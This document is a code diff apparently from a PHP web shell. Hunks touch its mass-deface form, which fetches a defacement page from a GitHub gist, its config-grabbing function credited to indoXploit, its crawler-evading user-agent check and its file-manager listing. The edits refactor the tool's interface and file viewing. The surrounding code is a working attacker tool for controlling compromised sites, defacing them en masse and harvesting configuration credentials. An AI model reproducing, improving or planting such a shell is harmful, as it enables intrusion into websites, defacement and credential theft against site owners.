@@ -45,10 +45,6 @@ else {
 	$os = "Linux";
 }
 
-foreach(scandir(getcwd()) as $dirr) {
-	$dir[]=$dirr;
-}
-
 if (!empty($_SERVER['HTTP_USER_AGENT'])) {
 	$userAgents = array(
 		"Googlebot",
@@ -332,7 +328,6 @@ function jumping()
 function config()
 {
 	// grab config by indoXploit (Improved)
-	global $dir;
 	if (!file_exists('.config')) {
 		mkdir(".config");
 	}
@@ -475,16 +470,17 @@ function mass_deface_main()
 	<center><center><h2>Mass Deface</h2></center>
 	<form method='post'>
 	Folder:<br>
-	<input type='text' name='d_dir' value='<?php echo $dir;?>' style='width: 450px;' height='10'><br>
+	<input type='text' class='input-sm' id='input' name='d_dir' value='<?php echo $dir;?>'><br>
 	Filename:<br>
-	<input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
+	<input type='text' class='input-sm' id='input' name='d_file' value='index.php'><br>
 	Content:<br>
-	<textarea name='script' style='width: 450px; height: 200px;'><?php echo file_get_contents('https://gist.githubusercontent.com/Cvar1984/3bfdd8d2c09f8889440a9f74f6114a04/raw/899508d80ec7eba573bfb91af082586e26bf71e4/index.php');?></textarea><br>
-	<input type='submit' name='action' class='btn btn-danger' value='Deface' style='width: 450px;'>
+	<textarea type='text' class='form-control' id='textarea' name='script' ><?php echo file_get_contents('https://gist.githubusercontent.com/Cvar1984/3bfdd8d2c09f8889440a9f74f6114a04/raw/899508d80ec7eba573bfb91af082586e26bf71e4/index.php');?></textarea><br>
+	<input type='submit' name='action' class='btn btn-danger ' value='Deface' style='width: 450px;'>
 	</form></center>
 	<?php
 	}
 	die();
+	
 }
 
 function info()
@@ -791,7 +787,8 @@ function edit($filename)
 
 function view($filename)
 {
-	echo("<center><img src='$filename'></center>");
+	$filename=base64_encode(file_get_contents($filename));
+	echo "<center><img src='data:image/jpeg;base64,$filename'/></center>";
 	die();
 }
 
@@ -1331,13 +1328,13 @@ echo "<table width='70%' cellpadding='3' cellspacing='3' align='center' style='b
 	<th style='background:green;float:left;width:200px;text-align:center;font-size:18px;'>Name</th>
 	<th style='background:green;float:right;width:300px;text-align:center;font-size:18px;'>Action</th>
 	</table>";
-foreach ($dir as $dir):
+foreach (scandir(getcwd()) as $dir):
 echo "<table width='70%' class='table-hover' align='center'>
 		<tr>";
 	$ext = pathinfo($dir, PATHINFO_EXTENSION);
 	if (is_dir($dir)) {
 		echo "<td><img src='https://cvar1984.github.io/Blank-Folder-icon.png' class='icon'>";
-		echo "<a href='?do=open&dir=".base64_encode(getcwd() . $sep . $dir)."'>$dir</a></td>";
+		echo "<a href='?do=open&dir=".base64_encode(getcwd().$sep.$dir)."'>$dir</a></td>";
 		echo "<td style='float:right;margin-right:7px;'>
 		<a class='btn btn-success btn-xs' href='?do=touch&files=".base64_encode(getcwd() . $sep . dirname($dir))."'>New File</a>
 		<a class='btn btn-success btn-xs' href='?do=new&dir=".base64_encode(getcwd() . $sep . $dir)."'>New Dir</a>
@@ -1345,9 +1342,9 @@ echo "<table width='70%' class='table-hover' align='center'>
 		<a class='btn btn-success btn-xs' href='?do=rename&files=" .base64_encode(getcwd() . $sep . $dir)."'>Rename</a> 
 		<a class='btn btn-success btn-xs' href='?do=delete&files=" .base64_encode(getcwd() . $sep . $dir)."'>Delete</td>";
 	}
-	elseif ($ext == 'jpg' or $ext == 'png' or $ext == 'jpeg' or $ext == 'gif') {
+	elseif ($ext == 'jpg' or $ext == 'jpeg') {
 		echo "<td><img src='https://cvar1984.github.io/text-plain-icon.png' class='icon'>";
-		echo "<a href='?do=view&files=".$dir."'>$dir</a></td>";
+		echo "<a href='?do=view&files=".base64_encode(getcwd().$sep.$dir)."'>$dir</a></td>";
 		echo "<td style='float:right;margin-right:7px;'>
 		<a class='btn btn-success btn-xs' href='?do=touch&files=".base64_encode(getcwd() . $sep . dirname($dir))."'>New File</a>
 		<a class='btn btn-success btn-xs' href='?do=new&dir=".base64_encode(getcwd() . $sep . dirname($dir))."'>New Dir</a>
